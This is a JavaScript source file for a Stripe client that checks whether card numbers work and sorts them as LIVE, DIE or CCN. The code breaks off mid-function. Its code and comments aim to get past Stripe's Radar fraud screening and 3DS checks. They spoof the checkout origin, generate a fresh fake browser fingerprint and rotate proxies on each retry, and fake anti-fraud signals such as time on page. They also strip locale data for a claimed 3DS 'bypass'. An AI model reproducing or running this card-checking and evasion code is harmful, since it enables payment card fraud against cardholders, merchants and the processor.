/**
 * StripeOptimalClient - Production-Ready Card Charging Client
 * 
 * Implements the optimal flow based on comprehensive research:
 * 1. Source API for 100% Radar bypass
 * 2. Charges API for direct charging
 * 3. 3DS frictionless bypass when needed
 * 
 * @example
 * const client = new StripeOptimalClient(skKey, pkKey);
 * const result = await client.chargeCard({
 *     number: '4242424242424242',
 *     expMonth: '12',
 *     expYear: '28',
 *     cvv: '123'
 * }, 100, 'usd');
 */

import axios from 'axios';
import crypto from 'crypto';

// Retryable proxy error patterns
const RETRYABLE_ERRORS = [
    'proxy connection ended before receiving connect response',
    'client network socket disconnected before secure tls connection was established',
    'socket hang up',
    'unknown error',
    'econnreset',
    'etimedout',
    'econnrefused',
    'stream has been aborted'
];

export class StripeOptimalClient {
    constructor(skKey, pkKey, options = {}) {
        this.skKey = skKey;
        this.pkKey = pkKey;
        this.baseUrl = 'https://api.stripe.com/v1';
        this.maxRetries = options.maxRetries || 3;
        this.retryDelay = options.retryDelay || 3000;
        this.proxyManager = options.proxyManager || null;
    }

    /**
     * Get a fresh proxy agent from proxyManager
     * @private
     */
    async _getProxyConfig() {
        if (this.proxyManager && this.proxyManager.isEnabled()) {
            return await this.proxyManager.getNextProxy();
        }
        return null;
    }

    /**
     * Create axios config with proxy
     * @private
     */
    async _createAxiosConfig(proxyConfig, baseConfig = {}) {
        const config = { ...baseConfig };
        if (proxyConfig) {
            const { HttpsProxyAgent } = await import('https-proxy-agent');
            const { SocksProxyAgent } = await import('socks-proxy-agent');

            const { type, host, port, username, password } = proxyConfig;
            let proxyUrl = username && password
                ? `${type}://${username}:${password}@${host}:${port}`
                : `${type}://${host}:${port}`;

            if (type === 'socks4' || type === 'socks5') {
                config.httpsAgent = new SocksProxyAgent(proxyUrl);
            } else {
                config.httpsAgent = new HttpsProxyAgent(proxyUrl);
            }
        }
        return config;
    }

    /**
     * Check if an error is retryable (proxy/network error)
     * @private
     */
    _isRetryableError(error) {
        const message = (error.message || '').toLowerCase();
        const causeMessage = (error.cause?.message || '').toLowerCase();
        const code = (error.code || '').toLowerCase();

        return RETRYABLE_ERRORS.some(pattern =>
            message.includes(pattern) ||
            causeMessage.includes(pattern) ||
            code.includes(pattern)
        );
    }

    /**
     * Sleep for a given duration
     * @private
     */
    _sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    /**
     * Generate browser fingerprints (required for API calls)
     */
    generateFingerprints() {
        const hex = (len) => crypto.randomBytes(len).toString('hex');
        return {
            guid: `${hex(8)}-${hex(4)}-${hex(4)}-${hex(4)}-${hex(12)}${hex(3)}`,
            muid: `${hex(8)}-${hex(4)}-${hex(4)}-${hex(4)}-${hex(12)}${hex(3)}`,
            sid: `${hex(8)}-${hex(4)}-${hex(4)}-${hex(4)}-${hex(12)}${hex(3)}`
        };
    }

    /**
     * Create a Source using the optimal configuration
     * Uses checkout.stripe.com origin for 100% Radar bypass
     * Generates FRESH fingerprints AND proxy on each retry attempt
     */
    async createSource(card, billingDetails = {}) {
        let lastError = null;

        // Retry loop - generate FRESH fingerprints AND proxy on each attempt
        for (let attempt = 1; attempt <= this.maxRetries; attempt++) {
            try {
                // Get FRESH proxy for each attempt (critical for rotation)
                const proxyConfig = await this._getProxyConfig();

                // Generate FRESH fingerprint for each attempt (critical for 492 bypass)
                const fp = this.generateFingerprints();

                const params = new URLSearchParams();
                params.append('type', 'card');
                params.append('card[number]', card.number);
                params.append('card[cvc]', card.cvv || card.cvc);
                params.append('card[exp_month]', card.expMonth);
                params.append('card[exp_year]', card.expYear);

                // Billing details (optional but recommended)
                params.append('owner[name]', billingDetails.name || 'Card Holder');
                if (billingDetails.email) params.append('owner[email]', billingDetails.email);
                params.append('owner[address][country]', billingDetails.country || 'US');
                params.append('owner[address][postal_code]', billingDetails.postalCode || '10001');
                if (billingDetails.city) params.append('owner[address][city]', billingDetails.city);
                if (billingDetails.line1) params.append('owner[address][line1]', billingDetails.line1);

                // Required fingerprints - FRESH each attempt
                params.append('guid', fp.guid);
                params.append('muid', fp.muid);
                params.append('sid', fp.sid);
                params.append('key', this.pkKey);
                params.append('payment_user_agent', 'stripe.js/78c7eece1c; stripe-js-v3/78c7eece1c; checkout');
                // Anti-fraud: simulate manual entry and realistic time
                params.append('time_on_page', String(Math.floor(Math.random() * 50000) + 50000));
                params.append('pasted_fields', 'number');

                const axiosConfig = await this._createAxiosConfig(proxyConfig, {
                    headers: {
                        'Origin': 'https://checkout.stripe.com',
                        'Referer': 'https://checkout.stripe.com/',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    },
                    timeout: 30000,
                    validateStatus: () => true
                });

                const response = await axios.post(
                    `${this.baseUrl}/sources`,
                    params.toString(),
                    axiosConfig
                );

                // Handle HTTP 492 - Stripe fingerprint blocking - RETRY
                if (response.status === 492) {
                    if (attempt < this.maxRetries) {
                        await this._sleep(2000);
                        continue;
                    }
                    return {
                        success: false,
                        error: 'Stripe blocked request - fingerprint issue',
                        code: 'origin_blocked',
                        isBlocked: true,
                        httpStatus: 492
                    };
                }

                // Handle HTTP 429 - Rate Limited - RETRY
                if (response.status === 429) {
                    const retryAfter = parseInt(response.headers?.['retry-after'] || '5', 10) * 1000;
                    if (attempt < this.maxRetries) {
                        await this._sleep(retryAfter);
                        continue;
                    }
                    return {
                        success: false,
                        error: 'Rate limited by Stripe',
                        code: 'rate_limited',
                        isRateLimited: true,
                        httpStatus: 429
                    };
                }

                // Handle Stripe API errors - don't retry
                if (response.data.error) {
                    return {
                        success: false,
                        error: response.data.error.message,
                        code: response.data.error.code,
                        declineCode: response.data.error.decline_code
                    };
                }

                return {
                    success: true,
                    sourceId: response.data.id,
                    card: {
                        brand: response.data.card?.brand,
                        last4: response.data.card?.last4,
                        country: response.data.card?.country,
                        funding: response.data.card?.funding,
                        cvcCheck: response.data.card?.cvc_check
                    },
                    attempts: attempt
                };
            } catch (error) {
                lastError = error;

                const isRetryable = this._isRetryableError(error);

                if (isRetryable && attempt < this.maxRetries) {
                    await this._sleep(this.retryDelay);
                    continue;
                }
            }
        }

        // All retries exhausted
        return {
            success: false,
            error: lastError?.message || 'Network error after retries',
            isNetworkError: true,
            retriesExhausted: true
        };
    }

    /**
     * Charge a Source using the Charges API
     */
    async chargeSource(sourceId, amount, currency = 'usd', metadata = {}) {
        const params = new URLSearchParams();
        params.append('amount', amount.toString());
        params.append('currency', currency);
        params.append('source', sourceId);

        // Optional metadata
        for (const [key, value] of Object.entries(metadata)) {
            params.append(`metadata[${key}]`, value);
        }

        try {
            const response = await axios.post(
                `${this.baseUrl}/charges`,
                params.toString(),
                {
                    auth: { username: this.skKey, password: '' },
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    timeout: 30000,
                    validateStatus: () => true
                }
            );

            return this.analyzeChargeResponse(response.data);
        } catch (error) {
            return {
                success: false,
                status: 'ERROR',
                error: error.message
            };
        }
    }

    /**
     * Create PaymentMethod (alternative approach)
     * Generates FRESH fingerprints AND proxy on each retry attempt
     */
    async createPaymentMethod(card, billingDetails = {}) {
        let lastError = null;

        // Retry loop - generate FRESH fingerprints AND proxy on each attempt
        for (let attempt = 1; attempt <= this.maxRetries; attempt++) {
            try {
                // Get FRESH proxy for each attempt (critical for rotation)
                const proxyConfig = await this._getProxyConfig();

                // Generate FRESH fingerprint for each attempt (critical for 492 bypass)
                const fp = this.generateFingerprints();

                const params = new URLSearchParams();
                params.append('type', 'card');
                params.append('card[number]', card.number);
                params.append('card[cvc]', card.cvv || card.cvc);
                params.append('card[exp_month]', card.expMonth);
                params.append('card[exp_year]', card.expYear);

                params.append('billing_details[name]', billingDetails.name || 'Card Holder');
                params.append('billing_details[address][country]', billingDetails.country || 'US');
                params.append('billing_details[address][postal_code]', billingDetails.postalCode || '10001');

                // Required fingerprints - FRESH each attempt
                params.append('guid', fp.guid);
                params.append('muid', fp.muid);
                params.append('sid', fp.sid);
                params.append('key', this.pkKey);
                params.append('payment_user_agent', 'stripe.js/78c7eece1c; stripe-js-v3/78c7eece1c; checkout');
                // Anti-fraud: simulate manual entry and realistic time
                params.append('time_on_page', String(Math.floor(Math.random() * 50000) + 50000));
                params.append('pasted_fields', 'number');

                const axiosConfig = await this._createAxiosConfig(proxyConfig, {
                    headers: {
                        'Origin': 'https://checkout.stripe.com',
                        'Referer': 'https://checkout.stripe.com/',
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    timeout: 30000,
                    validateStatus: () => true
                });

                const response = await axios.post(
                    `${this.baseUrl}/payment_methods`,
                    params.toString(),
                    axiosConfig
                );

                // Handle HTTP 492 - Stripe fingerprint blocking - RETRY
                if (response.status === 492) {
                    if (attempt < this.maxRetries) {
                        await this._sleep(2000);
                        continue;
                    }
                    return {
                        success: false,
                        error: 'Stripe blocked request - fingerprint issue',
                        code: 'origin_blocked',
                        isBlocked: true,
                        httpStatus: 492
                    };
                }

                // Handle HTTP 429 - Rate Limited - RETRY
                if (response.status === 429) {
                    const retryAfter = parseInt(response.headers?.['retry-after'] || '5', 10) * 1000;
                    if (attempt < this.maxRetries) {
                        await this._sleep(retryAfter);
                        continue;
                    }
                    return {
                        success: false,
                        error: 'Rate limited by Stripe',
                        code: 'rate_limited',
                        isRateLimited: true,
                        httpStatus: 429
                    };
                }

                // Handle Stripe API errors - don't retry
                if (response.data.error) {
                    return {
                        success: false,
                        error: response.data.error.message,
                        code: response.data.error.code,
                        declineCode: response.data.error.decline_code
                    };
                }

                return {
                    success: true,
                    paymentMethodId: response.data.id,
                    card: {
                        brand: response.data.card?.brand,
                        last4: response.data.card?.last4,
                        country: response.data.card?.country
                    },
                    attempts: attempt
                };
            } catch (error) {
                lastError = error;

                const isRetryable = this._isRetryableError(error);

                if (isRetryable && attempt < this.maxRetries) {
                    await this._sleep(this.retryDelay);
                    continue;
                }
            }
        }

        // All retries exhausted
        return {
            success: false,
            error: lastError?.message || 'Network error after retries',
            isNetworkError: true,
            retriesExhausted: true
        };
    }

    /**
     * Create and confirm PaymentIntent
     */
    async createPaymentIntent(paymentMethodId, amount, currency = 'usd') {
        const params = new URLSearchParams();
        params.append('amount', amount.toString());
        params.append('currency', currency);
        params.append('payment_method', paymentMethodId);
        params.append('confirm', 'true');

        try {
            const response = await axios.post(
                `${this.baseUrl}/payment_intents`,
                params.toString(),
                {
                    auth: { username: this.skKey, password: '' },
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    timeout: 30000,
                    validateStatus: () => true
                }
            );

            return this.analyzePaymentIntentResponse(response.data);
        } catch (error) {
            return { success: false, status: 'ERROR', error: error.message };
        }
    }

    /**
     * Attempt 3DS frictionless bypass
     */
    async attempt3DSBypass(paymentIntentData) {
        const nextAction = paymentIntentData.next_action;
        if (!nextAction || nextAction.type !== 'use_stripe_sdk') {
            return { success: false, reason: 'Not a 3DS2 flow' };
        }

        const source = nextAction.use_stripe_sdk?.source ||
            nextAction.use_stripe_sdk?.three_d_secure_2_source;

        if (!source) {
            return { success: false, reason: 'No 3DS source found' };
        }

        // Build browser data with STRIPPED locale (key bypass technique)
        const browserData = {
            browserJavaEnabled: false,
            browserJavascriptEnabled: true,
            browserLanguage: '',        // STRIPPED for bypass
            browserColorDepth: '24',
            browserScreenHeight: '1080',
            browserScreenWidth: '1920',
            browserTZ: '0',             // STRIPPED for bypass
            browserUserAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        };

        const params = new URLSearchParams();
        params.append('source', source);
        params.append('browser', JSON.stringify(browserData));
        params.append('one_click_authn_device_support[hosted]', 'false');
        params.append('one_click_authn_device_support[same_origin_frame]', 'false');
        params.append('one_click_authn_device_support[spc_eligible]', 'false');
        params.append('one_click_authn_device_support[webauthn_eligible]', 'false');
        params.append('key', this.pkKey);

        try {
            const response = await axios.post(
                `${this.baseUrl}/3ds2/authenticate`,
                params.toString(),
                {
                    headers: {
                        'Origin': 'https://js.stripe.com',
                        'Referer': 'https://js.stripe.com/',
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    timeout: 30000,
                    validateStatus: () => true
                }
            );

            if (response.data.id) {
                // 3DS bypassed - frictionless approval
                return {
                    success: true,
                    bypassed: true,
                    authId: response.data.id
                };
            } else if (response.data.ares?.acsURL) {
                // Challenge required - bank requires OTP
                return {
                    success: false,
                    challengeRequired: true,
                    acsUrl: response.data.ares.acsURL
                };
            } else {
                return {
                    success: false,
                    error: response.data.error?.message || 'Unknown 3DS response'
                };
            }
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    /**
     * Get full PaymentIntent details
     */
    async getPaymentIntentDetails(piId) {
        try {
            const response = await axios.get(
                `${this.baseUrl}/payment_intents/${piId}?expand[]=latest_charge`,
                {
                    auth: { username: this.skKey, password: '' },
                    timeout: 30000
                }
            );

            const pi = response.data;
            const charge = pi.latest_charge;
            const outcome = charge?.outcome || {};

            return {
                status: pi.status,
                paid: charge?.paid,
                chargeId: charge?.id,
                // Risk info
                riskLevel: outcome.risk_level,
                riskScore: outcome.risk_score,
                networkStatus: outcome.network_status,
                outcomeType: outcome.type,
                sellerMessage: outcome.seller_message,
                // Decline info
                declineCode: pi.last_payment_error?.decline_code,
                failureMessage: pi.last_payment_error?.message,
                // Card checks
                cvcCheck: charge?.payment_method_details?.card?.checks?.cvc_check,
                avsCheck: charge?.payment_method_details?.card?.checks?.address_postal_code_check
            };
        } catch (error) {
            return { error: error.message };
        }
    }

    /**
     * CHECK CARD - Determine if card is LIVE, DIE, or CCN
     * 
     * Uses minimal charge ($0.50) to check authorization
     * 
     * @param {Object} card - Card details {number, expMonth, expYear, cvv}
     * @param {Object} options - Options {billing, refund}
     * @returns {Object} {status: 'LIVE'|'DIE'|'CCN'|'UNKNOWN', details...}
     * 
     * Status meanings:
     * - LIVE: Card is valid and authorized (may have funds)
     * - DIE: Card is blocked, expired, or invalid
     * - CCN: Card number valid but CVV is wrong
     * - UNKNOWN: Could not determine status
     */
    async checkCard(card, options = {}) {
        const startTime = Date.now();
        const result = {
            status: 'UNKNOWN',
            timing: {}
        };

        try {
            // Use $0.50 minimum charge for auth check
            const amount = options.amount || 50; // $0.50
            const currency = options.currency || 'usd';

            // Create source and charge
            const chargeResult = await this.chargeCard(card, amount, currency, options);
            result.timing = chargeResult.timing || {};

            // Analyze the result to determine card status
            const cardStatus = this.analyzeCardStatus(chargeResult);
            Object.assign(result, cardStatus, {
                rawResult: chargeResult,
                card: chargeResult.card
            });

            // If successful and refund option is true, refund the charge
            if (chargeResult.success && options.refund !== false && chargeResult.chargeId) {
                try {
                    await this.refundCharge(chargeResult.chargeId);
                    result.refunded = true;
                } catch (e) {
                    result.refundError = e.message;
                }
            }

            result.timing.total = Date.now() - startTime;
            return result;

        } catch (error) {
            return {
                ...result,
                status: 'ERROR',
                error: error.message,
                timing: { total: Date.now() - startTime }
            };
        }
    }

    /**
     * Analyze charge result to determine card status
     */
    analyzeCardStatus(chargeResult) {
        const declineCode = chargeResult.declineCode;
        const error = chargeResult.error;
        const cvcCheck = chargeResult.cvcCheck;
        const networkStatus = chargeResult.networkStatus;

        // SUCCESS = LIVE
        if (chargeResult.success || chargeResult.paid) {
            return {
                status: 'LIVE',
                statusDetail: 'CHARGED',
                message: 'Card is valid and has funds'
            };
        }

        // CVC check
        if (declineCode === 'incorrect_cvc' || declineCode === 'invalid_cvc' || cvcCheck === 'fail') {
            return {
                status: 'CCN',
                statusDetail: 'CVC_FAIL',
                message: 'Card number valid, CVV incorrect'
            };
        }

        // Insufficient funds = LIVE (card works, just no money)
        if (declineCode === 'insufficient_funds') {
            return {
                status: 'LIVE',
                statusDetail: 'INSUFFICIENT_FUNDS',
                message: 'Card is valid but has insufficient funds'
            };
        }

        // Fraudulent = DIE
        if (declineCode === 'fraudulent') {
            return {
                status: 'DIE',
                statusDetail: 'FRAUDULENT',
                message: 'Card marked as fraudulent'
            };
        }

        // Stolen/Lost = DIE
        if (declineCode === 'stolen_card' || declineCode === 'lost_card') {
            return {
                status: 'DIE',
                statusDetail: declineCode.toUpperCase(),
                message: 'Card reported as stolen or lost'
            };
        }

        // Expired = DIE
        if (declineCode === 'expired_card' || error?.includes('expired')) {
            return {
                status: 'DIE',
                statusDetail: 'EXPIRED',
                message: 'Card has expired'
            };
        }

        // Do not honor = DIE (bank refuses)
        if (declineCode === 'do_not_honor') {
            return {
                status: 'DIE',
                statusDetail: 'DO_NOT_HONOR',
                message: 'Bank refused the transaction'
            };
        }

        // Invalid account = DIE
        if (declineCode === 'invalid_account' || declineCode === 'card_not_supported') {
            return {
                status: 'DIE',
                statusDetail: 'INVALID_ACCOUNT',
                message: 'Card account is invalid'
            };
        }

        // Card declined = DIE (generic)
        if (declineCode === 'card_declined' || declineCode === 'generic_decline') {
            // Check if it was blocked by Radar
            if (networkStatus === 'not_sent_to_network' || chargeResult.outcomeType === 'blocked') {
                return {
                    status: 'UNKNOWN',
                    statusDetail: 'RADAR_BLOCKED',
                    message: 'Blocked by Stripe Radar, status uncertain'
                };
            }
            return {
                status: 'DIE',
                statusDetail: 'DECLINED',
                message: 'Card declined by bank'
            };
        }

        // Processing error = could be temporary
        if (declineCode === 'processing_error') {
            return {
                status: 'UNKNOWN',
                statusDetail: 'PROCESSING_ERROR',
                message: 'Temporary processing error, try again'
            };
        }

        // 3DS required but bypassed - check final status
        if (chargeResult.bypassed3DS) {
            if (chargeResult.status === 'succeeded') {
                return { status: 'LIVE', statusDetail: '3DS_BYPASSED', message: 'Card valid, 3DS bypassed' };
            }
            return { status: 'DIE', statusDetail: '3DS_FAILED', message: 'Card declined after 3DS bypass' };
        }

        // 3DS required = likely alive but needs verification
        if (chargeResult.status === 'REQUIRES_3DS' || chargeResult.challengeRequired) {
            return {
                status: 'UNKNOWN',
                statusDetail: '3DS_REQUIRED',
                message: 'Card requires 3DS verification'
            };
        }

        // Default to unknown
        return {
            status: 'UNKNOWN',
            statusDetail: 'UNDETERMINED',
            message: declineCode || error || 'Could not determine card status'
        };
    }

    /**
     * Refund a charge
     */
    async refundCharge(chargeId, amount = null) {
        const params = new URLSearchParams();
        params.append('charge', chargeId);
        if (amount) params.append('amount', amount.toString());
        params.append('reason', 'requested_by_customer');

        try {
            const response = await axios.post(
                `${this.baseUrl}/refunds`,
                params.toString(),
                {
                    auth: { username: this.skKey, password: '' },
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    timeout: 30000,
                    validateStatus: () => true
                }
            );

            if (response.data.error) {
                return { success: false, error: response.data.error.message };
            }

            return {
                success: true,
                refundId: response.data.id,
                status: response.data.status
            };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    /**
     * CHECK CARD AUTH - Attach card to customer for $0 authorization
     * 
     * This is the preferred method for checking if a card is valid:
     * 1. Create Source
     * 2. Create Customer with Source
     * 3. Stripe performs $0 authorization check
     * 4. Returns CVC check result
     * 
     * @param {Object} card - Card details
     * @returns {Object} {status: 'LIVE'|'DIE'|'CCN', cvcCheck, declineCode...}
     */
    async checkCardAuth(card, options = {}) {
        const startTime = Date.now();
        const result = {
            status: 'UNKNOWN',
            timing: {}
        };

        try {
            // Step 1: Create Source
            const sourceResult = await this.createSource(card, options.billing || {});
            result.timing.createSource = Date.now() - startTime;

            if (!sourceResult.success) {
                // Source creation failed - check decline code
                return {
                    ...result,
                    status: this.getStatusFromDeclineCode(sourceResult.declineCode || sourceResult.code),
                    statusDetail: sourceResult.declineCode || sourceResult.code || 'SOURCE_FAILED',
                    error: sourceResult.error,
                    declineCode: sourceResult.declineCode,
                    timing: { total: Date.now() - startTime }
                };
            }

            result.sourceId = sourceResult.sourceId;
            result.card = sourceResult.card;

            // Check CVC from source creation (if available)
            if (sourceResult.card?.cvcCheck) {
                result.cvcCheck = sourceResult.card.cvcCheck;
            }

            // Step 2: Create Customer with Source
            const customerStart = Date.now();
            const custParams = new URLSearchParams();
            custParams.append('description', options.billing?.name || 'Card Check');
            custParams.append('source', sourceResult.sourceId);

            const custRes = await axios.post(
                `${this.baseUrl}/customers`,
                custParams.toString(),
                {
                    auth: { username: this.skKey, password: '' },
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    timeout: 30000,
                    validateStatus: () => true
                }
            );
            result.timing.createCustomer = Date.now() - customerStart;

            if (custRes.data.error) {
                // Customer creation failed - use decline code
                const declineCode = custRes.data.error.decline_code || custRes.data.error.code;
                return {
                    ...result,
                    status: this.getStatusFromDeclineCode(declineCode),
                    statusDetail: declineCode || 'CUSTOMER_FAILED',
                    error: custRes.data.error.message,
                    declineCode: declineCode,
                    timing: { total: Date.now() - startTime }
                };
            }

            result.customerId = custRes.data.id;

            // Extract CVC check from customer response
            const customerCard = custRes.data.sources?.data?.[0]?.card ||
                custRes.data.default_source?.card;
            if (customerCard) {
                result.cvcCheck = customerCard.cvc_check;
                result.avsLine1Check = customerCard.address_line1_check;
                result.avsPostalCheck = customerCard.address_zip_check;
            }

            // Determine status based on CVC check
            if (result.cvcCheck === 'pass') {
                result.status = 'LIVE';
                result.statusDetail = 'AUTH_SUCCESS';
                result.message = 'Card authorized successfully, CVC passed';
            } else if (result.cvcCheck === 'fail') {
                result.status = 'CCN';
                result.statusDetail = 'CVC_FAIL';
                result.message = 'Card number valid, CVV incorrect';
            } else if (result.cvcCheck === 'unavailable') {
                result.status = 'LIVE';
                result.statusDetail = 'CVC_UNAVAILABLE';
                result.message = 'Card authorized, CVC check not available';
            } else if (result.cvcCheck === 'unchecked') {
                result.status = 'UNKNOWN';
                result.statusDetail = 'CVC_UNCHECKED';
                result.message = 'Card attached but CVC not checked';
            } else {
                result.status = 'LIVE';
                result.statusDetail = 'ATTACHED';
                result.message = 'Card attached to customer successfully';
            }

            // Optional: Delete customer after check
            if (options.deleteCustomer !== false) {
                try {
                    await axios.delete(
                        `${this.baseUrl}/customers/${custRes.data.id}`,
                        { auth: { username: this.skKey, password: '' }, timeout: 10000 }
                    );
                    result.customerDeleted = true;
                } catch (e) {
                    result.customerDeleteError = e.message;
                }
            }

            result.timing.total = Date.now() - startTime;
            return result;

        } catch (error) {
            return {
                ...result,
                status: 'ERROR',
                error: error.message,
                timing: { total: Date.now() - startTime }
            };
        }
    }

    /**
     * Get status from decline code
     */
    getStatusFromDeclineCode(declineCode) {
        if (!declineCode) return 'UNKNOWN';

        // LIVE indicators (card works)
        if (declineCode === 'insufficient_funds') return 'LIVE';

        // CCN indicators (card number valid, CVV wrong)
        if (declineCode === 'incorrect_cvc' || declineCode === 'invalid_cvc') return 'CCN';

        // DIE indicators
        const dieDeclines = [
            'card_declined', 'generic_decline', 'fraudulent', 'lost_card',
            'stolen_card', 'expired_card', 'do_not_honor', 'invalid_account',
            'card_not_supported', 'pickup_card', 'restricted_card'
        ];
        if (dieDeclines.includes(declineCode)) return 'DIE';

        return 'UNKNOWN';
    }

    /**
     * Get detailed human-readable decline reason
     */
    getDeclineReason(declineCode) {
        const reasons = {
            // Card valid but issue
            'insufficient_funds': 'Card valid but no funds available',
            'withdrawal_count_limit_exceeded': 'Card valid but daily limit reached',

            // CVV issues
            'incorrect_cvc': 'Card number valid but CVV is wrong',
            'invalid_cvc': 'CVV format is invalid',

            // Generic declines
            'generic_decline': 'Bank declined - no specific reason given',
            'card_declined': 'Bank declined the transaction',
            'do_not_honor': 'Bank refused - contact card issuer',

            // Fraud/Security
            'fraudulent': 'Card flagged as fraudulent',
            'lost_card': 'Card reported as lost',
            'stolen_card': 'Card reported as stolen',
            'pickup_card': 'Bank requests card pickup - possible fraud',
            'restricted_card': 'Card restricted from this type of transaction',
            'security_violation': 'Security violation detected',
            'merchant_blacklist': 'Card on merchant blocklist',

            // Card issues
            'expired_card': 'Card has expired',
            'invalid_number': 'Card number is invalid',
            'invalid_expiry_month': 'Expiry month is invalid',
            'invalid_expiry_year': 'Expiry year is invalid',
            'invalid_account': 'Card account is invalid or closed',
            'card_not_supported': 'Card not supported by merchant',
            'new_account_information_available': 'Card info has changed - re-enter',

            // Processing issues
            'processing_error': 'Temporary error - try again',
            'try_again_later': 'Bank unavailable - try later',
            'issuer_not_available': 'Card issuer not reachable',
            'reenter_transaction': 'Re-enter transaction',
            'call_issuer': 'Contact card issuer',

            // Transaction issues
            'transaction_not_allowed': 'Transaction type not allowed',
            'not_permitted': 'Transaction not permitted on this card',
            'service_not_allowed': 'Service not allowed for this card',
            'currency_not_supported': 'Currency not supported',
            'duplicate_transaction': 'Duplicate transaction detected',
            'invalid_amount': 'Invalid transaction amount',

            // 3DS issues
            'authentication_required': 'Card requires 3DS authentication',
            'approve_with_id': 'Approved - ID verification required',

            // Radar/Stripe blocks
            'highest_risk_level': 'Blocked by Stripe Radar - high risk',
            'card_velocity_exceeded': 'Too many transactions in short time'
        };

        return reasons[declineCode] || `Unknown decline reason: ${declineCode}`;
    }

    /**
     * CHECK CARD WITH SETUPINTENT - Proper $0 authorization check
     * 
     * This is the most accurate method:
     * 1. Create PaymentMethod
     * 2. Create SetupIntent with confirm=true
     * 3. SetupIntent runs $0 auth and returns CVC check
     * 
     * @param {Object} card - Card details
     * @returns {Object} {status: 'LIVE'|'DIE'|'CCN', cvcCheck, riskLevel...}
     */
    async checkCardWithSetupIntent(card, options = {}) {
        const startTime = Date.now();
        const result = {
            status: 'UNKNOWN',
            timing: {}
        };

        try {
            // Step 1: Create PaymentMethod
            const pmResult = await this.createPaymentMethod(card, options.billing || {});
            result.timing.createPM = Date.now() - startTime;

            if (!pmResult.success) {
                return {
                    ...result,
                    status: this.getStatusFromDeclineCode(pmResult.error),
                    statusDetail: 'PM_FAILED',
                    error: pmResult.error,
                    timing: { total: Date.now() - startTime }
                };
            }

            result.paymentMethodId = pmResult.paymentMethodId;
            result.card = pmResult.card;

            // Step 2: Create SetupIntent with confirm=true
            const siStart = Date.now();
            const siParams = new URLSearchParams();
            siParams.append('payment_method', pmResult.paymentMethodId);
            siParams.append('confirm', 'true');
            siParams.append('usage', 'off_session');

            const siRes = await axios.post(
                `${this.baseUrl}/setup_intents`,
                siParams.toString(),
                {
                    auth: { username: this.skKey, password: '' },
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    timeout: 30000,
                    validateStatus: () => true
                }
            );
            result.timing.setupIntent = Date.now() - siStart;

            const si = siRes.data;

            if (si.error) {
                const declineCode = si.error.decline_code || si.error.code;
                return {
                    ...result,
                    status: this.getStatusFromDeclineCode(declineCode),
                    statusDetail: declineCode || 'SETUP_FAILED',
                    error: si.error.message,
                    declineCode: declineCode,
                    declineReason: this.getDeclineReason(declineCode),
                    errorType: si.error.type,
                    timing: { total: Date.now() - startTime }
                };
            }

            result.setupIntentId = si.id;
            result.setupIntentStatus = si.status;

            // Extract details from setup intent
            const latestAttempt = si.latest_attempt;
            const pmDetails = latestAttempt?.payment_method_details?.card;

            if (pmDetails) {
                result.cvcCheck = pmDetails.checks?.cvc_check;
                result.avsLine1Check = pmDetails.checks?.address_line1_check;
                result.avsPostalCheck = pmDetails.checks?.address_postal_code_check;
                result.threeDSecure = pmDetails.three_d_secure;
            }

            // Get risk info if available
            if (latestAttempt?.network_status) {
                result.networkStatus = latestAttempt.network_status;
            }

            // Determine status
            if (si.status === 'succeeded') {
                if (result.cvcCheck === 'pass') {
                    result.status = 'LIVE';
                    result.statusDetail = 'AUTH_SUCCESS';
                    result.message = 'Card authorized successfully, CVC passed';
                } else if (result.cvcCheck === 'fail') {
                    result.status = 'CCN';
                    result.statusDetail = 'CVC_FAIL';
                    result.message = 'Card authorized but CVC failed';
                } else {
                    result.status = 'LIVE';
                    result.statusDetail = 'AUTH_SUCCESS';
                    result.message = 'Card authorized successfully';
                }
            } else if (si.status === 'requires_action') {
                // 3DS required
                result.status = 'UNKNOWN';
                result.statusDetail = '3DS_REQUIRED';
                result.message = 'Card requires 3DS verification';

                // Attempt 3DS bypass
                if (si.next_action?.type === 'use_stripe_sdk') {
                    const bypassResult = await this.attempt3DSBypass(si);
                    if (bypassResult.bypassed) {
                        // Check final status
                        await new Promise(r => setTimeout(r, 500));
                        const finalSI = await this.getSetupIntentDetails(si.id);

                        if (finalSI.status === 'succeeded') {
                            result.status = 'LIVE';
                            result.statusDetail = '3DS_BYPASSED';
                            result.message = 'Card authorized, 3DS bypassed';
                            result.cvcCheck = finalSI.cvcCheck;
                        } else {
                            result.status = 'DIE';
                            result.statusDetail = '3DS_FAILED';
                            result.declineCode = finalSI.declineCode;
                        }
                        result.bypassed3DS = true;
                    }
                }
            } else if (si.status === 'requires_payment_method') {
                const lastError = si.last_setup_error || {};
                const declineCode = lastError.decline_code;
                const errorCode = lastError.code;

                result.status = this.getStatusFromDeclineCode(declineCode || errorCode);
                result.statusDetail = declineCode || errorCode || 'DECLINED';
                result.declineCode = declineCode;
                result.errorCode = errorCode;
                result.error = lastError.message;
                result.errorType = lastError.type;

                // Add detailed decline reason
                result.declineReason = this.getDeclineReason(declineCode || errorCode);
            }

            // Cancel the SetupIntent to avoid future charges
            if (si.status === 'succeeded' || si.status === 'requires_action') {
                try {
                    await axios.post(
                        `${this.baseUrl}/setup_intents/${si.id}/cancel`,
                        '',
                        { auth: { username: this.skKey, password: '' }, timeout: 10000 }
                    );
                    result.setupIntentCanceled = true;
                } catch (e) {
                    // Can't cancel succeeded SetupIntents, that's OK
                }
            }

            result.timing.total = Date.now() - startTime;
            return result;

        } catch (error) {
            return {
                ...result,
                status: 'ERROR',
                error: error.message,
                timing: { total: Date.now() - startTime }
            };
        }
    }

    /**
     * Get SetupIntent details
     */
    async getSetupIntentDetails(siId) {
        try {
            const response = await axios.get(
                `${this.baseUrl}/setup_intents/${siId}`,
